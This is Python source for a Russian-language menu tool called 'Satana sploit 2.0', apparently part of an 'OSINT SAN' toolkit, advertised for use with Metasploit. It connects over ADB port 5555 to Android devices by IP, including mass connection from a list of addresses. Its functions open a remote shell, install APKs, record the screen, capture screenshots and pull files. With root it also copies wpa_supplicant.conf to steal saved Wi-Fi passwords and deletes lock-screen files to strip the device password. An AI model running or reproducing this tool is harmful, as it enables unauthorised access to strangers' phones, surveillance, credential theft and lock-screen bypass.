#!/usr/bin/python
#-*- coding: utf-8 -*-
#Developer by Bafomet
import os
import time as t
import subprocess
from module.utils.banner import show_banner

WHSL = '\033[1;32m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
GNSL = '\033[1;34m'

arrow = f" {REDL}└──>{WHSL}"
connect = f"{REDL}│{WHSL}"

page_1 = '''{0}
 {1}Использовать в связке с {0}Metasploit framework.
 {1}Satana sploit 2.0
        
 {1}[ {0}1{1} ] {2} Показать подключенные устройства.       {1}[ {0}10{1} ] {2} Перезагрузка устройства.    {1}[ {0}19{1} ] {2} Извлечь apk из приложения.
 {1}[ {0}2{1} ] {2} Отключить все устройства.               {1}[ {0}11{1} ] {2} Удалить приложение.         {1}[ {0}20{1} ] {0} Get Battery Status.
 {1}[ {0}3{1} ] {2} Подключите новое устройство.            {1}[ {0}12{1} ] {2} Показать журнал устройства. {1}[ {0}21{1} ] {0} Get Network Status.
 {1}[ {0}4{1} ] {2} Доступ через {0}shell.                     {1}[ {0}13{1} ] {2} Dump {0}System Info.           {1}[ {0}22{1} ] {2} Включение / выключение {0}Wi-Fi.
 {1}[ {0}5{1} ] {2} Установите{0} apk{2} на устройство.           {1}[ {0}14{1} ] {2} Список всех приложений.     {1}[ {0}23{1} ] {2} Удалить пароль устройства.
 {1}[ {0}6{1} ] {2} Записать видео с экрана.                {1}[ {0}15{1} ] {2} Запустить приложение.       {1}[ {0}24{1} ] {2} Эмуляция нажатия клавиш.
 {1}[ {0}7{1} ] {2} Получить {0}screenshot.                    {1}[ {0}16{1} ] {2} Port Forwarding.            {1}[ {0}25{1} ] {2} Получить текущую активность (Логи).
 {1}[ {0}8{1} ] {2} Перезапустить ваш{0} server.               {1}[ {0}17{1} ] {0} Grab wpa_supplicant.        {1}[ {0}26{1} ] {2} Массовое подключение устройств.
 {1}[ {0}9{1} ] {2} Получить файлы из устройства.           {1}[ {0}18{1} ] {0} Show Mac/Inet.       
  
 {1}[ {0}99{1} ] {2}Выйти и отключить{0} adb server.           {1}[ {0}66{1} ]{2} Очистить.                    {1}[ {0}88{1} ]{2} Отключить{0} server.
'''.format(GNSL, REDL, WHSL)

def android_debug():
    os.system("printf '\033]2;OSINT SAN 3.5\a'")
    print()
    print("{1} [ {0}+{1} ]{2} Запуск ADB сервера...".format(REDL, GNSL, WHSL))
    print()
    print("{1} [ {0}+{1} ]{2} Подождите 5 секунд.".format(REDL, GNSL, WHSL))
    print()
    subprocess.call("adb tcpip 5555 >> /dev/null", shell=True)
    show_banner(clear=True)
    print(page_1)

    device_name = None
    while True:
        try:
            option = input(
                f"{REDL} └──>{ENDL} Android Debug Bridge {GNSL}[{REDL} main_menu {GNSL}]{ENDL}:")
        except KeyboardInterrupt:
            return

        if option == '1':
            if not device_name:
                subprocess.call("adb devices -l", shell=True)
            else:
                subprocess.call("adb devices -l", shell=True)

        elif option == '2':
            if not device_name:
                print("{1} [{0} + {1}]{2} Нет подключенных устройств к серверу.\n".format(REDL, GNSL, WHSL))
            else:
                subprocess.call("adb disconnect", shell=True)

        elif option == '3':
            print("\n {1}[{0} + {1}]{2} Введите IP address.\n".format(REDL, GNSL, WHSL))
            try:
                device_name = input(f"{arrow} Android Debug Bridge {GNSL}[{REDL} connect_device {GNSL}]{ENDL}:")
            except KeyboardInterrupt:
                continue
            if device_name == '':
                continue
            if device_name == '27':
                continue
            subprocess.call(f"adb connect {device_name}:5555", shell=True)

        elif option == '4':
            if not device_name:
                print("{1} [{0} + {1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                subprocess.call(f"adb -s {device_name} shell", shell=True)

        elif option == '5':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Введите локацию apk. Пример /home/salita/Desktop/test.apk.\n".format(REDL, GNSL, WHSL))
                apk_location = input(f"    {arrow} Android Debug Bridge{GNSL}[{REDL} apk_install {GNSL}]{ENDL}:")
                subprocess.call("adb -s  "+device_name+" install "+apk_location, shell=True)
                print(f" {GNSL}Apk был установлен.")

        elif option == '6':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Запись видео началась.".format(REDL, GNSL, WHSL))
                print(f"     {connect}")
                print("    {2}Нажми{1} ctrl+c{2} для остановки записи.\n".format(REDL, GNSL, WHSL))
                os.system(f"adb -s {device_name} shell screenrecord /sdcard/screen.mp4")
                print("  {1}[{0} + {1}]{2} Укажите, где вы хотите сохранить видео.\n".format(REDL, GNSL, WHSL))
                print("  {2}   Пример:{1} /home/apashe/sc.mp4\n".format(REDL, GNSL, WHSL))
                place_location = input(f"    {arrow} Android Debug Bridge {GNSL}[{REDL}screen_record{GNSL}]{ENDL}:")
                os.system(f"adb -s {device_name} pull /sdcard/screen.mp4 {place_location}")
                print("    {0} Видео {2}успешно загружено.".format(REDL, GNSL, WHSL))
                t.sleep(4)
                show_banner(clear=True)
                print(page_1)

        elif option == '7':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell screencap /sdcard/screen.png")
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Введите, где вы хотите сохранить снимок экрана.\n".format(REDL, GNSL, WHSL))
                print("    {1}Пример:{0} /home/apashe/screen.png\n".format(REDL, GNSL, WHSL))
                place_location = input(f"    {arrow} Android Debug Bridge {GNSL}[{REDL} screenshot {GNSL}]{ENDL}:")
                os.system(f"adb -s {device_name} pull /sdcard/screen.png {place_location}")
                print("    {0} Скриншот {2}успешно загружен.".format(REDL, GNSL, WHSL))
                t.sleep(4)
                show_banner(clear=True)
                print(page_1)
                

        elif option == '8':
               print("")
               print("{1} [{0} + {1}]{2} Перезапуск сервера ADB...{3}\n".format(REDL, GNSL, WHSL, ENDL))
               os.system("adb disconnect >> /dev/null")
               os.system("adb kill-server >> /dev/null")
               os.system("adb start-server >> /dev/null")
               print(" {0}  Сервер успешно перезагружен".format(REDL, GNSL, WHSL, ENDL))
               t.sleep(4)
               show_banner(clear=True)
               print(page_1)

        elif option == '9':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства еще не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Введите местоположение файла на устройстве.\n".format(REDL, GNSL, WHSL))
                print("   {1}[{0} + {1}]{2} Пример:{0} /sdcard/DCIM/demo.mp4 \n".format(REDL, GNSL, WHSL))
                file_location = input(f"    {arrow} Android Debug Bridge {GNSL}[{REDL} file_pull {GNSL}]{ENDL}:")
                print(f"        {connect}")
                print("      {1}[{0} + {1}]{2} Пример:{0} /home/apashe/Desktop\n".format(REDL, GNSL, WHSL))
                print("      {1}[{0} + {1}]{2} Введите, где вы хотите сохранить файл.\n".format(REDL, GNSL, WHSL))
                place_location = input(f"       {arrow} Android Debug Bridge {GNSL}[{REDL} file_pull {GNSL}]{ENDL}:")
                os.system(f"adb -s {device_name} pull {file_location} {place_location}")
                print(page_1)

        elif option == '10':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} reboot ")
                print("   {2}Устройство будет перезагруженно, ожидайте 1 минуту прежде чем вновь повторить подключение.".format(REDL, GNSL, WHSL))
                t.sleep(4)
                show_banner(clear=True)
                print(page_1)

        elif option == '11':
            if not device_name:
                print("{1}[{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Введите название pack_name \n".format(REDL, GNSL, WHSL))
                package_name = input(f"    {arrow} Android Debug Bridge {GNSL}[{REDL} app_delete {GNSL}]{ENDL}:")
                os.system(f"adb -s {device_name} unistall {package_name}")

        elif option == '12':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print("\n    {2}Нажми{1} ctrl+c{2} для остановки.{0}\n".format(REDL, GNSL, WHSL))
                t.sleep(4)
                os.system(f'adb -s {device_name} logcat ')

        elif option == '13':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print("\n    {2}Нажми{1} ctrl+c{2} для остановки.{0}\n".format(REDL, GNSL, WHSL))
                t.sleep(4)
                os.system(f"adb -s {device_name} shell dumpsys")

        elif option == '14':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell pm list packages -f")

        elif option == '15':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            print(f"     {connect}")
            print("    {1}[{0} + {1}]{2} Введите название приложения.\n".format(REDL, GNSL, WHSL))
            package_name = input(f"    {arrow} Android Debug Bridge {GNSL}[{REDL} Запуск приложения {GNSL}]{ENDL}:")
            os.system(f"adb -s {device_name} shell monkey -p "+package_name+" -v 500")

        elif option == '16':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Введите порт на устройстве.\n".format(REDL, GNSL, WHSL))
                port_device = input("    " +arrow + " Android Debug Bridge"+GNSL+"["+REDL + " port_forward " + GNSL + "]"+ENDL + ":")
                print(f"         {connect}")
                print("       {1}[{0} + {1}]{2} Введите порт для пересылки.\n".format(REDL, GNSL, WHSL))
                forward_port = input("        "+arrow + " Android Debug Bridge "+GNSL+"["+REDL + " port_forward " + GNSL + "]"+ENDL + ":")
                os.system(f"adb -s {device_name} forward tcp:"+port_device+" tcp:"+forward_port)

        elif option == '17':
            try:
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Введите, где вы хотите сохранить файл.\n".format(REDL, GNSL, WHSL))
                location = input(f"    {arrow} Android Debug Bridge {GNSL}[{REDL} wpa_grub {GNSL}]{ENDL}:")
                os.system(f"adb -s {device_name} shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                os.system(f"adb -s {device_name} pull /sdcard/wpa_supplicant.conf {location}")

            except KeyboardInterrupt:
                if not device_name:
                    print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))

        elif option == '18':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell ip address show wlan0")

        elif option == '19':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            print(f"     {connect}")
            print("   {1}[{0} + {1}]{2} Введите название apk.\n".format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " Android Debug Bridge "+GNSL+"["+REDL + " pull_apk " + GNSL + "]"+ENDL + ":")
            os.system(f"adb -s {device_name} shell pm path "+package_name)
            print(f"         {connect}")
            print("       {1}[{0} + {1}]{2} Введите путь к apk на устойстве.\n".format(REDL, GNSL, WHSL))
            path = input("        "+arrow + " Android Debug Bridge"+GNSL+"["+REDL + " pull_apk " + GNSL + "]"+ENDL + ":")
            print(f"             {connect}")
            print("           {1}[{0} + {1}]{2} Введите место хранения apk.\n".format(REDL, GNSL, WHSL))
            location = input(f"            {arrow} Android Debug Bridge {GNSL}[{REDL}pull_apk{GNSL}]{ENDL}:")
            os.system(f"adb -s {device_name} pull {path} {location}")
            t.sleep(5)
            show_banner(clear=True)
            print(page_1)

        elif option == '20':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell dumpsys battery")

        elif option == '21':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell netstat")

        elif option == '22':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("   {1}[{0} + {1}]{2} Чтобы снова включить WiFi, устройство должно быть подключено.".format(REDL, GNSL, WHSL))
                print(f"     {connect}")
                on_off = input(f"{GNSL}   [{REDL} + {GNSL}]{WHSL} Хотите включить/выключить WiFi on/off{REDL} :")
                if on_off == 'off':
                    command = " shell svc wifi disable"
                else:
                    command = " shell svc wifi enable"

                os.system(f"adb -s {device_name} {command}")

        elif option == '23':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print(REDL + "****************** REMOVING PASSWORD ******************")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/gesture.key'")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/locksettings.db'")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/locksettings.db-wal'")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/locksettings.db-shm'")
                print(REDL + "****************** REMOVING PASSWORD ******************")

        elif option == '24':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            show_banner(clear=True)
            print(f'''
 {GNSL}[ {REDL}0{GNSL} ]  {WHSL}Кнопка_UNKNOWN       {GNSL}[ {REDL}21{GNSL} ]{WHSL}  Кнопка_DPAD_LEFT      {GNSL}[ {REDL}42{GNSL} ]{WHSL}  Кнопка_N            {GNSL}[ {REDL}63{GNSL} ]{WHSL}  Кнопка_SYM
 {GNSL}[ {REDL}1{GNSL} ]  {WHSL}Кнопка_MENU          {GNSL}[ {REDL}22{GNSL} ]{WHSL}  Кнопка_DPAD_RIGHT     {GNSL}[ {REDL}43{GNSL} ]{WHSL}  Кнопка_O            {GNSL}[ {REDL}64{GNSL} ]{WHSL}  Кнопка_EXPLORER
 {GNSL}[ {REDL}2{GNSL} ]  {WHSL}Кнопка_SOFT_RIGHT    {GNSL}[ {REDL}23{GNSL} ]{WHSL}  Кнопка_DPAD_CENTER    {GNSL}[ {REDL}44{GNSL} ]{WHSL}  Кнопка_P            {GNSL}[ {REDL}65{GNSL} ]{WHSL}  Кнопка_ENVELOPE
 {GNSL}[ {REDL}3{GNSL} ]  {WHSL}Кнопка_HOME          {GNSL}[ {REDL}24{GNSL} ]{WHSL}  Кнопка_VOLUME_UP      {GNSL}[ {REDL}45{GNSL} ]{WHSL}  Кнопка_Q            {GNSL}[ {REDL}66{GNSL} ]{WHSL}  Кнопка_ENTER
 {GNSL}[ {REDL}4{GNSL} ]  {WHSL}Кнопка_BACK          {GNSL}[ {REDL}25{GNSL} ]{WHSL}  Кнопка_VOLUME_DOWN    {GNSL}[ {REDL}46{GNSL} ]{WHSL}  Кнопка_R            {GNSL}[ {REDL}67{GNSL} ]{WHSL}  Кнопка_DEL
 {GNSL}[ {REDL}5{GNSL} ]  {WHSL}Кнопка_CALL          {GNSL}[ {REDL}26{GNSL} ]{WHSL}  Кнопка_POWER          {GNSL}[ {REDL}47{GNSL} ]{WHSL}  Кнопка_S            {GNSL}[ {REDL}68{GNSL} ]{WHSL}  Кнопка_GRAVE
 {GNSL}[ {REDL}6{GNSL} ]  {WHSL}Кнопка_ENDCALL       {GNSL}[ {REDL}27{GNSL} ]{WHSL}  Кнопка_CAMERA         {GNSL}[ {REDL}48{GNSL} ]{WHSL}  Кнопка_T            {GNSL}[ {REDL}69{GNSL} ]{WHSL}  Кнопка_MINUS
 {GNSL}[ {REDL}7{GNSL} ]  {WHSL}Кнопка_0             {GNSL}[ {REDL}28{GNSL} ]{WHSL}  Кнопка_CLEAR          {GNSL}[ {REDL}49{GNSL} ]{WHSL}  Кнопка_U            {GNSL}[ {REDL}70{GNSL} ]{WHSL}  Кнопка_EQUALS
 {GNSL}[ {REDL}8{GNSL} ]  {WHSL}Кнопка_1             {GNSL}[ {REDL}29{GNSL} ]{WHSL}  Кнопка_A              {GNSL}[ {REDL}50{GNSL} ]{WHSL}  Кнопка_V            {GNSL}[ {REDL}71{GNSL} ]{WHSL}  Кнопка_LEFT_BRACKET
 {GNSL}[ {REDL}9{GNSL} ]  {WHSL}Кнопка_2             {GNSL}[ {REDL}30{GNSL} ]{WHSL}  Кнопка_B              {GNSL}[ {REDL}51{GNSL} ]{WHSL}  Кнопка_W            {GNSL}[ {REDL}72{GNSL} ]{WHSL}  Кнопка_RIGHT_BRACKET
 {GNSL}[ {REDL}10{GNSL} ] {WHSL}Кнопка_3             {GNSL}[ {REDL}31{GNSL} ]{WHSL}  Кнопка_C              {GNSL}[ {REDL}52{GNSL} ]{WHSL}  Кнопка_X            {GNSL}[ {REDL}73{GNSL} ]{WHSL}  Кнопка_BACKSLASH
 {GNSL}[ {REDL}11{GNSL} ] {WHSL}Кнопка_4             {GNSL}[ {REDL}32{GNSL} ]{WHSL}  Кнопка_D              {GNSL}[ {REDL}53{GNSL} ]{WHSL}  Кнопка_Y            {GNSL}[ {REDL}74{GNSL} ]{WHSL}  Кнопка_SEMICOLON
 {GNSL}[ {REDL}12{GNSL} ] {WHSL}Кнопка_5             {GNSL}[ {REDL}33{GNSL} ]{WHSL}  Кнопка_E              {GNSL}[ {REDL}54{GNSL} ]{WHSL}  Кнопка_Z            {GNSL}[ {REDL}75{GNSL} ]{WHSL}  Кнопка_APOSTROPHE
 {GNSL}[ {REDL}13{GNSL} ] {WHSL}Кнопка_6             {GNSL}[ {REDL}34{GNSL} ]{WHSL}  Кнопка_F              {GNSL}[ {REDL}55{GNSL} ]{WHSL}  Кнопка_COMMA        {GNSL}[ {REDL}76{GNSL} ]{WHSL}  Кнопка_SLASH
 {GNSL}[ {REDL}14{GNSL} ] {WHSL}Кнопка_7             {GNSL}[ {REDL}35{GNSL} ]{WHSL}  Кнопка_G              {GNSL}[ {REDL}56{GNSL} ]{WHSL}  Кнопка_PERIOD       {GNSL}[ {REDL}77{GNSL} ]{WHSL}  Кнопка_AT
 {GNSL}[ {REDL}15{GNSL} ] {WHSL}Кнопка_8             {GNSL}[ {REDL}36{GNSL} ]{WHSL}  Кнопка_H              {GNSL}[ {REDL}57{GNSL} ]{WHSL}  Кнопка_ALT_LEFT     {GNSL}[ {REDL}78{GNSL} ]{WHSL}  Кнопка_NUM
 {GNSL}[ {REDL}16{GNSL} ] {WHSL}Кнопка_9             {GNSL}[ {REDL}37{GNSL} ]{WHSL}  Кнопка_I              {GNSL}[ {REDL}58{GNSL} ]{WHSL}  Кнопка_ALT_RIGHT    {GNSL}[ {REDL}79{GNSL} ]{WHSL}  Кнопка_HEADSETHOOK
 {GNSL}[ {REDL}17{GNSL} ] {WHSL}Кнопка_STAR          {GNSL}[ {REDL}38{GNSL} ]{WHSL}  Кнопка_J              {GNSL}[ {REDL}59{GNSL} ]{WHSL}  Кнопка_SHIFT_LEFT   {GNSL}[ {REDL}80{GNSL} ]{WHSL}  Кнопка_FOCUS
 {GNSL}[ {REDL}18{GNSL} ] {WHSL}Кнопка_POUND         {GNSL}[ {REDL}39{GNSL} ]{WHSL}  Кнопка_K              {GNSL}[ {REDL}60{GNSL} ]{WHSL}  Кнопка_SHIFT_RIGHT  {GNSL}[ {REDL}81{GNSL} ]{WHSL}  Кнопка_PLUS
 {GNSL}[ {REDL}19{GNSL} ] {WHSL}Кнопка_DPAD_UP       {GNSL}[ {REDL}40{GNSL} ]{WHSL}  Кнопка_L              {GNSL}[ {REDL}61{GNSL} ]{WHSL}  Кнопка_TAB          {GNSL}[ {REDL}82{GNSL} ]{WHSL}  Кнопка_MENU
 {GNSL}[ {REDL}20{GNSL} ] {WHSL}Кнопка_DPAD_DOWN     {GNSL}[ {REDL}41{GNSL} ]{WHSL}  Кнопка_M              {GNSL}[ {REDL}62{GNSL} ]{WHSL}  Кнопка_SPACE        {GNSL}[ {REDL}83{GNSL} ]{WHSL}  Кнопка_NOTIFICATION
 ''')
            print(" {1}[{0} + {1}]{2} Введите номер кнопки.\n".format(REDL, GNSL, WHSL))
            num = input(f"{arrow} Android Debug Bridge {GNSL}[{REDL} Кнопка {GNSL}]{ENDL}:")
            os.system(f"adb -s {device_name} shell input keyevent {num}")
            print(" {1}[{0} + {1}]{2} Вы активировали кнопку".format(REDL, GNSL, WHSL))
            t.sleep(4)
            show_banner(clear=True)
            print(page_1)

        elif option == '25':
            if not device_name:
                print("{1} [{0} + {1}]{2} Устройства еще не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell dumpsys activity")

        elif option == "26":
            try:
                print("     {2}Пример пути:{0} /home/apashe/Desktop/test.txt")
                print("")
                path_to_ips = input("{1} [{0} + {1}]{2} Введите путь к вашему txt файлу с IP адресами{1}:{0}".format(REDL, GNSL, WHSL))
            except KeyboardInterrupt:
                continue

            with open(path_to_ips, "r") as f:
                ip_adb_addresses = f.read().splitlines()

            for ip_address in ip_adb_addresses:
                subprocess.call(f"adb connect {ip_address}:{5555}", shell=True)

        elif option == '88':
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")

        elif option == '66':
            print()
            show_banner(clear=True)
            print(page_1)

        elif option == '99':
            return

        else:
            show_banner(clear=True)
            print(page_1)
